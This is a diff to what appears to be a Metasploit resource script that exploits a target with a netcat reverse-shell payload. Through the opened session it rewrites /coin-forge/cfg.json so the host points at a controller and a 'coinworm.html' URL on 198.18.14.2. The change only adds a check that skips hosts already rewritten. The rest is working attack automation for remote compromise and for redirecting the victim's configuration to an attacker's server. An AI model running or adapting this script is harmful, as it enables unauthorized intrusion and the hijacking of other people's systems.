@@ -7,5 +7,5 @@ set PAYLOAD cmd/unix/reverse_netcat
 set DisablePayloadHandler false
 exploit -j
 sleep 10
-sessions -i 1 -c 'bash -c "if [ -e /tmp/cfg_update.lock ]; then echo \"Lock exists on target, exiting.\"; exit 1; fi; touch /tmp/cfg_update.lock; echo \"{\" > /coin-forge/cfg.json; echo \"    \\\"CONTROLLER_IP\\\": \\\"198.18.14.2\\\",\" >> /coin-forge/cfg.json; echo \"    \\\"TARGET_URL\\\": \\\"http://198.18.14.2:8088/coinworm.html\\\",\" >> /coin-forge/cfg.json; echo \"    \\\"COIN_FORGE_HOST\\\": \\\"CoinForge-2\\\"\" >> /coin-forge/cfg.json; echo \"}\" >> /coin-forge/cfg.json; rm -f /tmp/cfg_update.lock"'
+sessions -i 1 -c 'bash -c "if [ -e /tmp/cfg_update.lock ]; then echo \"Lock exists on target, exiting.\"; exit 1; fi; if grep -q \"coinworm\" /coin-forge/cfg.json; then echo \"TARGET_URL already contains coinworm. Exiting.\"; exit 0; fi; touch /tmp/cfg_update.lock; echo \"{\" > /coin-forge/cfg.json; echo \"    \\\"CONTROLLER_IP\\\": \\\"198.18.14.2\\\",\" >> /coin-forge/cfg.json; echo \"    \\\"TARGET_URL\\\": \\\"http://198.18.14.2:8088/coinworm.html\\\",\" >> /coin-forge/cfg.json; echo \"    \\\"COIN_FORGE_HOST\\\": \\\"CoinForge-2\\\"\" >> /coin-forge/cfg.json; echo \"}\" >> /coin-forge/cfg.json; rm -f /tmp/cfg_update.lock"'
 exit -y
